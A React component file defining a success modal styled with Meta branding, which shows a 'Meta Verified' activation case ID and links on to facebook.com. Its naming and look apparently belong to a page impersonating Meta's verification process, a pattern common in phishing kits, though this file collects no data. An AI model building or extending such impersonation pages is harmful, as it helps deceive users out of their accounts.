'use client'

import React from 'react';

import { useAppStrings } from '@/hooks/useAppStrings';
import { getOrCreateActivationRef } from '@/utils/metaVerifiedActivation';

import Modal from './Modal';

interface SuccessModalProps {
    isOpend: boolean;
    onToggleSuccess: (value: boolean) => void;
}

const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess }) => {
    const t = useAppStrings();
    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [ticketId, setTicketId] = React.useState('');

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    React.useEffect(() => {
        if (isOpen) {
            setTicketId(getOrCreateActivationRef().ticketId);
        }
    }, [isOpen]);

    const handleClose = () => {
        setIsOpen(false);
        onToggleSuccess(false);
    };

    return (
        <Modal
            isOpen={isOpen}
            title={t.success.title}
            onClose={handleClose}
        >

            <div className="flex min-h-full w-full min-w-0 flex-col gap-8 pb-2">
                <div className="w-full min-w-0">
                    <div className="mb-[15px] flex flex-col items-center rounded-[16px] border border-[#c9daf5] bg-[linear-gradient(145deg,#eef4ff_0%,#f3ecff_100%)] px-6 py-8">
                        <img
                            src="/images/icons/ic_blue.svg"
                            className="h-[72px] w-[72px] drop-shadow-[0_4px_12px_rgba(24,119,242,0.25)]"
                            alt={t.main.altVerifiedBadge}
                        />
                        {ticketId ? (
                            <p className="mt-[14px] text-center text-[13px] font-medium text-[#4c6087] sm:text-[14px]">
                                {t.main.caseId} #{ticketId}
                            </p>
                        ) : null}
                    </div>
                    <p className='text-[#4f5f79] mb-[10px] text-[15px] leading-[1.65]'>
                        {t.success.p1}
                    </p>
                    <p className='text-[#6b7b95] mb-[20px] text-[14px] leading-[1.6]'>
                        {t.success.p2}
                    </p>
                    <a
                        className='min-h-[48px] w-full bg-[linear-gradient(90deg,#1877f2_0%,#7b3ff2_100%)] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 hover:opacity-90 active:opacity-90'
                        href="https://www.facebook.com"
                    >
                        {t.success.cta}
                    </a>
                </div>

                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                </div>
            </div>
        </Modal>
    );
};

export default SuccessModal;
